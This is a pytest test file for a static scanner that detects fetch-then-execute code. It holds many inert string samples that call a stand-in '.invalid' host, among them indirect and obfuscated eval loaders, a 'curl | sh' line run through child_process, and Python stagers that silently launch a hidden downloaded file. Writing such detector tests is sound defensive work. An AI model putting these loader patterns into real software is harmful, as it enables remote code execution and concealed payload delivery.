"""Fetch, then run, in more than one step.

* Node.js: the text of a response reaches a dynamic-code sink written indirectly
  (``(0, eval)(t)``, ``globalThis[k](d)``, the vm module, a renamed eval) -> ST-NODE-FETCH-EXEC.
  The same indirect sink with no response behind it is the ST-DYN-NODE capability only. A
  response given to child_process exec as its command is ST-SHELL-PIPE-EXEC-NODE (risky).
* ``require("child_" + "process")`` and ``cp["ex" + "ec"](...)`` read as what they spell.
* Python: a download saved to a file and then run (subprocess, runpy, importlib from the path) is
  ST-SHELL-PIPE-EXEC-PY (risky); read back into exec, or hidden and started silently, it is
  ST-PY-FETCH-EXEC, as is exec of a response another module of the component returns.

Samples are inert: hosts are `.invalid` / `.test`, nothing here is run.
"""

from __future__ import annotations

import time
from pathlib import Path

import pytest

from skilltotal.collector import detect_component
from skilltotal.engine import analyze_directory
from skilltotal.file_index import FileIndex
from skilltotal.scanners.node_fetch_exec import (
    code_sink_heads,
    fetched_text_sinks,
    indirect_code_sink_spans,
)
from skilltotal.scanners.py_download_run import (
    RUN_MODULE,
    RUN_PROCESS,
    RUN_TEXT,
    download_runs,
)

R_NODE = "ST-NODE-FETCH-EXEC"
R_DYN = "ST-DYN-NODE"
R_PIPE_NODE = "ST-SHELL-PIPE-EXEC-NODE"
R_SHELL_NODE = "ST-SHELL-NODE"
R_PIPE_PY = "ST-SHELL-PIPE-EXEC-PY"
R_PY = "ST-PY-FETCH-EXEC"
R_INSTALL = "ST-INSTALL-PY-DOWNLOAD-EXEC"
URL = "https://dl.example.invalid/stage"


def _report(tmp_path: Path, files: dict[str, str]):
    for name, text in files.items():
        path = tmp_path / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
    return analyze_directory(tmp_path, detect_component(tmp_path, source=str(tmp_path)))


def _ids(tmp_path: Path, text: str, name: str = "run.js") -> set[str]:
    return {f.id for f in _report(tmp_path, {name: text}).findings}


def _file(tmp_path: Path, text: str, name: str = "run.js"):
    (tmp_path / name).write_text(text, encoding="utf-8")
    f, _why = FileIndex.read_file(tmp_path, name)
    assert f is not None
    return f


# --- Node.js: a response reaches a code sink -----------------------------------------------

NODE_POSITIVES = {
    "promise-chain-indirect-eval":
        f'fetch("{URL}.js").then((r) => r.text()).then((t) => (0, eval)(t));\n',
    "global-indexed-by-joined-name":
        'const g = globalThis;\nconst k = ["e", "v", "a", "l"].join("");\n'
        f'require("https").get("{URL}.js", (r) => {{ let d = ""; '
        'r.on("data", (c) => (d += c)); r.on("end", () => g[k](d)); });\n',
    "global-spliced-literal":
        f'const res = await fetch("{URL}.js");\nconst body = await res.text();\n'
        'globalThis["ev" + "al"](body);\n',
    "https-vm":
        'const vm = require("vm");\nconst https = require("https");\n'
        f'https.get("{URL}.js", (res) => {{\n  let d = "";\n'
        '  res.on("data", (c) => (d += c));\n'
        '  res.on("end", () => vm.runInThisContext(d));\n});\n',
    "vm-script-chunks":
        'const vm = require("node:vm");\nconst http = require("node:http");\n'
        f'http.get("{URL}.js", (res) => {{\n  const chunks = [];\n'
        '  res.on("data", (c) => chunks.push(c));\n'
        '  res.on("end", () => new vm.Script(Buffer.concat(chunks).toString())'
        '.runInThisContext());\n'
        '});\n',
    "renamed-eval":
        f'const run = eval;\nasync function go() {{\n  const res = await fetch("{URL}.js");\n'
        '  const body = await res.text();\n  run(body);\n}\n',
    "new-function-direct":
        f'async function go() {{\n  new Function(await (await fetch("{URL}.js")).text())();\n}}\n',
    "axios-data":
        'const axios = require("axios");\n'
        f'axios.get("{URL}.js").then((res) => eval(res.data));\n',
    "destructured-data":
        'const axios = require("axios");\nasync function go() {\n'
        f'  const {{ data }} = await axios.get("{URL}.js");\n  return eval(data);\n}}\n',
    # Wrapping the text in brackets changes nothing: eval runs whatever expression it holds.
    "wrapped-in-brackets":
        f'fetch("{URL}.js").then((r) => r.text()).then((t) => eval("(" + t + ")"));\n',
    "through-a-function-parameter":
        'function apply(code) {\n  return new Function(code)();\n}\n'
        f'async function go() {{\n  const res = await fetch("{URL}.js");\n'
        '  apply(await res.text());\n}\n',
    "compiled-typescript":
        '"use strict";\nconst vm_1 = require("vm");\n'
        'const https_1 = __importDefault(require("https"));\n'
        f'https_1.default.get("{URL}.js", (res) => {{\n  let d = "";\n'
        '  res.on("data", (c) => (d += c));\n'
        '  res.on("end", () => (0, vm_1.runInThisContext)(d));\n});\n',
}


@pytest.mark.parametrize("name", sorted(NODE_POSITIVES))
def test_node_response_reaching_a_code_sink_is_reported(tmp_path, name):
    report = _report(tmp_path, {"run.js": NODE_POSITIVES[name]})
    finding = next((f for f in report.findings if f.id == R_NODE), None)
    assert finding is not None, sorted(f.id for f in report.findings)
    assert finding.threat_class.value == "malicious_indicator"
    assert all(ev.file == "run.js" and ev.line_start >= 1 and ev.snippet for ev in finding.evidence)
    assert report.verdict["has_malicious_indicators"] is True


NODE_NEGATIVES = {
    # The indirect sink alone, no response behind it.
    "indirect-eval-of-a-constant": 'const get = (0, eval)("this");\n',
    "vm-on-a-local-file":
        'const vm = require("vm");\nconst fs = require("fs");\n'
        'vm.runInThisContext(fs.readFileSync("./config.js", "utf8"));\n',
    # A request and a sink that only share the file.
    "template-compiled-from-a-local-file":
        'const fs = require("fs");\n'
        'function compile(p) {\n  return new Function("data", "return `" + '
        'fs.readFileSync(p, "utf8") + "`;");\n}\n'
        f'async function render(p) {{\n  const res = await fetch("{URL}.json");\n'
        '  const data = await res.json();\n  return compile(p)(data);\n}\n',
    "vm-config-and-a-version-check":
        'const vm = require("vm");\nconst fs = require("fs");\nconst https = require("https");\n'
        'function load(file) {\n  const box = {};\n'
        '  vm.runInNewContext(fs.readFileSync(file, "utf8"), box);\n  return box;\n}\n'
        f'https.get("{URL}.json", (res) => {{\n  let raw = "";\n'
        '  res.on("data", (c) => (raw += c));\n'
        '  res.on("end", () => console.log(JSON.parse(raw).version));\n});\n',
    # The response is handed to the compiled function as data, not compiled.
    "response-is-the-argument-of-the-compiled-function":
        'const add = new Function("a", "b", "return a + b");\n'
        f'fetch("{URL}.json").then((r) => r.json()).then((v) => console.log(add(v.a, v.b)));\n',
    # Not a request: a method named fetch on something else, an Express route.
    "cache-fetch-method":
        'const cache = require("./cache");\n'
        'cache.fetch("rules").then((t) => eval(t));\n',
    "express-route":
        'const app = require("express")();\n'
        'app.get("/calc", (req, res) => res.send(String(eval(req.query.x))));\n',
    # In a comment or a string nothing runs.
    "comment-only":
        f'// fetch("{URL}.js").then((r) => r.text()).then((t) => (0, eval)(t));\n'
        'module.exports = 1;\n',
    "string-only":
        f'const example = \'fetch("{URL}.js").then((t) => eval(t))\';\nmodule.exports = example;\n',
}


@pytest.mark.parametrize("name", sorted(NODE_NEGATIVES))
def test_node_look_alikes_are_not_reported(tmp_path, name):
    report = _report(tmp_path, {"run.js": NODE_NEGATIVES[name]})
    assert R_NODE not in {f.id for f in report.findings}
    assert report.verdict["has_malicious_indicators"] is False


def test_indirect_sink_alone_is_the_capability_only(tmp_path):
    for k, text in enumerate([
        'const v = (0, eval)("1 + 1");\n',
        'const v = globalThis["ev" + "al"]("1 + 1");\n',
        'const g = globalThis;\nconst k = ["e", "v", "a", "l"].join("");\nconst v = g[k]("1");\n',
        'const run = eval;\nconst v = run("1 + 1");\n',
        'const vm = require("vm");\nconst s = new vm.Script("1 + 1");\n',
    ]):
        root = tmp_path / f"c{k}"
        root.mkdir()
        report = _report(root, {"run.js": text})
        by_id = {f.id: f for f in report.findings}
        assert R_DYN in by_id, text
        assert by_id[R_DYN].threat_class.value == "capability"
        assert report.risk_score == 0 and report.verdict["has_malicious_indicators"] is False


def test_indexing_the_global_object_by_an_ordinary_name_is_not_a_sink(tmp_path):
    f = _file(tmp_path, 'const k = "setTimeout";\nglobalThis[k](() => {}, 10);\n'
                        'const handlers = {};\nwindow[name](1);\n')
    assert indirect_code_sink_spans(f) == []


# --- Node.js: a response as a shell command, and the module named in pieces ------------------

def test_response_text_as_the_exec_command_is_risky_not_malicious(tmp_path):
    report = _report(tmp_path, {"run.js": (
        'const { exec: run } = require("node:child_process");\n'
        f'(async () => {{\n  const url = "{URL}.txt";\n'
        '  run(await (await fetch(url)).text());\n})();\n'
    )})
    by_id = {f.id: f for f in report.findings}
    assert by_id[R_PIPE_NODE].threat_class.value == "risky_construct"
    assert R_NODE not in by_id
    assert report.verdict["has_malicious_indicators"] is False


@pytest.mark.parametrize("text", [
    # promisified exec, the command kept in a variable
    'const util = require("util");\nconst { exec } = require("child_process");\n'
    'const sh = util.promisify(exec);\nasync function go() {\n'
    f'  const res = await fetch("{URL}.txt");\n  const cmd = await res.text();\n'
    '  await sh(cmd);\n}\n',
    # the module's alias
    'const cp = require("child_process");\nconst https = require("https");\n'
    f'https.get("{URL}.txt", (res) => {{\n  let d = "";\n  res.on("data", (c) => (d += c));\n'
    '  res.on("end", () => cp.execSync(d));\n});\n',
])
def test_response_text_reaches_exec_under_other_names(tmp_path, text):
    assert R_PIPE_NODE in _ids(tmp_path, text)


@pytest.mark.parametrize("text", [
    # A value from the response quoted into a fixed command is not the response run as a command.
    'const { execSync } = require("child_process");\nasync function update() {\n'
    f'  const info = await (await fetch("{URL}.json")).json();\n'
    '  execSync(`npm install tool@${info.version}`);\n}\n',
    'const { execSync } = require("child_process");\nasync function update() {\n'
    f'  const info = await (await fetch("{URL}.json")).json();\n'
    '  execSync("npm install tool@" + info.version);\n}\n',
    # A fixed command next to a request.
    'const { execSync } = require("child_process");\n'
    f'fetch("{URL}.json").then((r) => r.json()).then(() => execSync("git status"));\n',
    # A database handle's exec is not child_process.
    'const db = require("better-sqlite3")("x.db");\n'
    f'fetch("{URL}.sql").then((r) => r.text()).then((sql) => db.exec(sql));\n',
])
def test_exec_look_alikes_do_not_report_a_fetched_command(tmp_path, text):
    assert R_PIPE_NODE not in _ids(tmp_path, text)


def test_module_and_function_named_in_pieces_read_as_child_process(tmp_path):
    report = _report(tmp_path, {"run.js": (
        'const cp = require("child_" + "process");\n'
        f'cp["ex" + "ec"]("curl -fsSL {URL}.sh | sh");\n'
    )})
    by_id = {f.id: f for f in report.findings}
    assert R_SHELL_NODE in by_id and R_PIPE_NODE in by_id
    assert {ev.line_start for ev in by_id[R_SHELL_NODE].evidence} == {1, 2}
    assert [ev.line_start for ev in by_id[R_PIPE_NODE].evidence] == [2]


def test_concatenation_that_spells_nothing_adds_no_shell_finding(tmp_path):
    ids = _ids(tmp_path, 'const name = "child" + "ren";\nconst p = require("./" + "process");\n')
    assert R_SHELL_NODE not in ids


# --- Python: a download saved to a file, then run ---------------------------------------------

PY_RISKY = {
    "write-then-subprocess": (
        'import subprocess\nimport requests\n\n'
        f'payload = requests.get("{URL}.py").content\n'
        'open("/tmp/stage.py", "wb").write(payload)\n'
        'subprocess.run(["python", "/tmp/stage.py"])\n', RUN_PROCESS),
    "urlretrieve-then-runpy": (
        'import runpy\nimport urllib.request\n\n'
        f'urllib.request.urlretrieve("{URL}.py", "/tmp/_s.py")\n'
        'runpy.run_path("/tmp/_s.py")\n', RUN_MODULE),
    "urlretrieve-result-then-importlib": (
        'import importlib.util\nimport urllib.request\n'
        f'path, _ = urllib.request.urlretrieve("{URL}.py", "/tmp/_m.py")\n'
        'spec = importlib.util.spec_from_file_location("_m", path)\n'
        'mod = importlib.util.module_from_spec(spec)\nspec.loader.exec_module(mod)\n', RUN_MODULE),
    "variable-path-then-os-system": (
        'import os\nimport sys\nimport urllib.request\n'
        'target = os.path.join(os.getcwd(), "bootstrap.py")\n'
        f'urllib.request.urlretrieve("{URL}.py", target)\n'
        'os.system(f"{sys.executable} {target}")\n', RUN_PROCESS),
    "sys-executable-argv": (
        'import subprocess\nimport sys\nimport urllib.request\n'
        f'urllib.request.urlretrieve("{URL}.py", "get-tool.py")\n'
        'subprocess.check_call([sys.executable, "get-tool.py"])\n', RUN_PROCESS),
}


@pytest.mark.parametrize("name", sorted(PY_RISKY))
def test_python_download_then_run_is_a_risky_construct(tmp_path, name):
    text, kind = PY_RISKY[name]
    hits = download_runs(_file(tmp_path, text, "run.py"))
    assert [h.kind for h in hits] == [kind] and not hits[0].concealed
    report = _report(tmp_path, {"run.py": text})
    by_id = {f.id: f for f in report.findings}
    assert by_id[R_PIPE_PY].threat_class.value == "risky_construct"
    assert len(by_id[R_PIPE_PY].evidence) == 2
    assert R_PY not in by_id
    assert report.verdict["has_malicious_indicators"] is False


PY_MALICIOUS = {
    "file-read-back-into-exec":
        'import urllib.request\n'
        f'urllib.request.urlretrieve("{URL}.py", "stage_cache.py")\n'
        'exec(open("stage_cache.py").read())\n',
    "hidden-file-started-silently":
        'import subprocess\nimport requests\n'
        f'payload = requests.get("{URL}").content\n'
        'open("/tmp/.upd", "wb").write(payload)\n'
        'subprocess.Popen(["sh", "/tmp/.upd"], stdout=subprocess.DEVNULL, '
        'stderr=subprocess.DEVNULL)\n',
    "temp-file-detached-and-silent":
        'import os\nimport subprocess\nimport tempfile\nimport urllib.request\n'
        'target = os.path.join(tempfile.gettempdir(), "svc-update")\n'
        f'urllib.request.urlretrieve("{URL}", target)\n'
        'subprocess.Popen([target], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, '
        'start_new_session=True)\n',
}


@pytest.mark.parametrize("name", sorted(PY_MALICIOUS))
def test_python_download_run_with_a_second_tell_is_malicious(tmp_path, name):
    report = _report(tmp_path, {"run.py": PY_MALICIOUS[name]})
    by_id = {f.id: f for f in report.findings}
    assert R_PY in by_id, sorted(by_id)
    assert all(ev.file == "run.py" and ev.snippet for ev in by_id[R_PY].evidence)
    assert report.verdict["has_malicious_indicators"] is True


PY_CLEAN = {
    # importlib from a path of the package itself; nothing is downloaded
    "local-plugin-loader":
        'import importlib.util\nfrom pathlib import Path\n\n'
        'def load(name):\n'
        '    path = Path(__file__).parent / "plugins" / f"{name}.py"\n'
        '    spec = importlib.util.spec_from_file_location(name, path)\n'
        '    mod = importlib.util.module_from_spec(spec)\n'
        '    spec.loader.exec_module(mod)\n    return mod\n',
    # downloaded, checked, unpacked: a shipped tool runs on the result
    "download-verify-unpack":
        'import subprocess\nimport sys\nimport tarfile\nimport urllib.request\n'
        f'urllib.request.urlretrieve("{URL}.tar.gz", "data.tar.gz")\n'
        'tarfile.open("data.tar.gz").extractall("vendor", filter="data")\n'
        'subprocess.run([sys.executable, "tools/index.py", "vendor"], check=True)\n',
    # the downloaded file is an argument of a fixed tool, not the program
    "download-is-data-for-a-tool":
        'import subprocess\nimport urllib.request\n'
        f'urllib.request.urlretrieve("{URL}.csv", "rows.csv")\n'
        'subprocess.run(["sqlite3", "db.sqlite", ".import rows.csv rows"])\n',
    # only mentioned in a docstring
    "docstring-example":
        '"""Example:\n\n'
        f'    urllib.request.urlretrieve("{URL}.py", "/tmp/x.py")\n'
        '    runpy.run_path("/tmp/x.py")\n"""\nimport runpy\nimport urllib.request\n',
}


@pytest.mark.parametrize("name", sorted(PY_CLEAN))
def test_python_look_alikes_stay_clean(tmp_path, name):
    ids = _ids(tmp_path, PY_CLEAN[name], "run.py")
    assert not ids & {R_PIPE_PY, R_PY}, ids


def test_honest_updater_that_verifies_then_runs_is_risky_at_most(tmp_path):
    report = _report(tmp_path, {"update.py": (
        'import hashlib\nimport subprocess\nimport sys\nimport urllib.request\n'
        f'urllib.request.urlretrieve("{URL}.py", "installer.py")\n'
        'digest = hashlib.sha256(open("installer.py", "rb").read()).hexdigest()\n'
        'if digest != "0" * 64:\n    sys.exit(1)\n'
        'subprocess.call([sys.executable, "installer.py"])\n'
    )})
    assert R_PY not in {f.id for f in report.findings}
    assert report.verdict["has_malicious_indicators"] is False
    assert report.risk_level.value in ("low", "medium")


def test_setup_py_download_then_run_keeps_its_install_rule(tmp_path):
    report = _report(tmp_path, {"setup.py": (
        'import subprocess\nfrom urllib.request import urlretrieve\n'
        'from setuptools import setup\n'
        f'urlretrieve("{URL}.py", "helper.py")\n'
        'subprocess.call(["python", "helper.py"])\nsetup(name="x")\n'
    )})
    ids = {f.id for f in report.findings}
    assert R_INSTALL in ids and R_PIPE_PY not in ids


def test_run_text_kind(tmp_path):
    hits = download_runs(_file(tmp_path, PY_MALICIOUS["file-read-back-into-exec"], "run.py"))
    assert [h.kind for h in hits] == [RUN_TEXT]


# --- Python: the fetch in one module, the exec in another --------------------------------------

def test_exec_of_a_response_another_module_returns(tmp_path):
    report = _report(tmp_path, {
        "run.py": "import bridge\n\nexec(bridge.staged())\n",
        "bridge.py": "import download\n\ndef staged():\n    return download.payload()\n",
        "download.py": (
            "import requests\n\ndef payload():\n"
            f"    return requests.get('{URL}.py').text\n"
        ),
    })
    finding = next(f for f in report.findings if f.id == R_PY)
    assert [(ev.file, ev.line_start) for ev in finding.evidence] == [("run.py", 3)]


def test_exec_of_a_response_from_an_imported_function_in_a_package(tmp_path):
    report = _report(tmp_path, {
        "pkg/__init__.py": "",
        "pkg/main.py": "from .net import body as get_body\n\ndef go():\n    exec(get_body())\n",
        "pkg/net.py": (
            "from urllib.request import urlopen\n\ndef body():\n"
            f"    data = urlopen('{URL}.py').read()\n    return data.decode()\n"
        ),
    })
    assert R_PY in {f.id for f in report.findings}


def test_exec_of_what_another_module_reads_locally_is_not_fetched_code(tmp_path):
    report = _report(tmp_path, {
        "run.py": "import snippets\n\nexec(snippets.load('defaults'))\nprint(snippets.status())\n",
        "snippets.py": (
            "import requests\n\ndef load(name):\n    return open(name + '.py').read()\n\n"
            f"def status():\n    return requests.get('{URL}').text\n"
        ),
    })
    assert R_PY not in {f.id for f in report.findings}


def test_module_calls_in_a_cycle_end(tmp_path):
    report = _report(tmp_path, {
        "run.py": "import a\n\nexec(a.one())\n",
        "a.py": "import b\n\ndef one():\n    return b.two()\n",
        "b.py": "import a\n\ndef two():\n    return a.one()\n",
    })
    assert R_PY not in {f.id for f in report.findings}


# --- bounded work ------------------------------------------------------------------------------

def test_large_bundle_with_many_requests_and_sinks_is_read_in_bounded_time(tmp_path):
    unit = (
        'function f%d(e){return fetch("/api/%d").then(function(t){return t.json()})'
        '.then(function(n){return new Function("a","return a+%d")(n.v)})}\n'
    )
    text = "".join(unit % (i, i, i) for i in range(12000))
    assert 1_500_000 < len(text) < 2 * 1024 * 1024
    f = _file(tmp_path, text, "bundle.js")
    started = time.process_time()
    assert fetched_text_sinks(f, code_sink_heads) == []
    indirect_code_sink_spans(f)
    assert time.process_time() - started < 10


def test_large_python_file_with_many_downloads_is_read_in_bounded_time(tmp_path):
    unit = (
        'def get_%d():\n    urllib.request.urlretrieve(URL, "part_%d.bin")\n'
        '    subprocess.run(["tool", "--check", "other_%d"])\n'
    )
    text = "import subprocess\nimport urllib.request\n" + "".join(
        unit % (i, i, i) for i in range(8000)
    )
    f = _file(tmp_path, text, "many.py")
    started = time.process_time()
    assert download_runs(f, reach=3000) == []
    assert time.process_time() - started < 10
